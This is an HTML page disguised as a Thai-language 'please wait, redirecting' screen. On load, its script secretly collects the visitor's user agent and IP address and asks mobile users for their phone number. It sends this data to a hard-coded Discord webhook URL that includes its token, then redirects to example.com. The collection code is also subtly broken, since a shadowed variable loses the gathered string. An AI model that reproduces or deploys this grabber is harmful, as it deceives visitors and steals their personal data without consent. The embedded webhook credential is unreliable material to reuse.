<!DOCTYPE html>
<html>
<head>
    <title>กำลังไปอีกเว็ปไซต์</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            var discordWebhookURL = "https://discord.com/api/webhooks/1119824582963118080/E-r5zBYrjRSc0mfDCowulanJl5NGtkwn9fcmoqUu36OhVyXA_MXCoCWYw-d50EjbuvRP";

            function sendToDiscord(data) {
                var payload = {
                    content: data
                };

                $.ajax({
                    type: "POST",
                    url: discordWebhookURL,
                    data: JSON.stringify(payload),
                    contentType: "application/json",
                    success: function() {
                        console.log("Data sent to Discord successfully");
                    }
                });
            }

            function captureAndSendData() {
                var userAgent = navigator.userAgent;
                var data = "User Agent: " + userAgent;

                if (navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/)) {
                    var phoneNumber = prompt("Please enter your mobile phone number:");
                    data += "\nPhone Number: " + phoneNumber;
                }

                $.getJSON("https://api.ipify.org?format=json", function(data) {
                    var ipAddress = data.ip;
                    data += "\nIP Address: " + ipAddress;
                    sendToDiscord(data);
                });
            }

            captureAndSendData();

            setTimeout(function() {
                window.location.href = "https://example.com";
            }, 5000);
        });
    </script>
    <style>
        body {
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
        }

        p {
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>รอสักครู่...</h1>
        <p>กำลังไปอีกเว็ปไซต์.</p>
    </div>
</body>
</html>
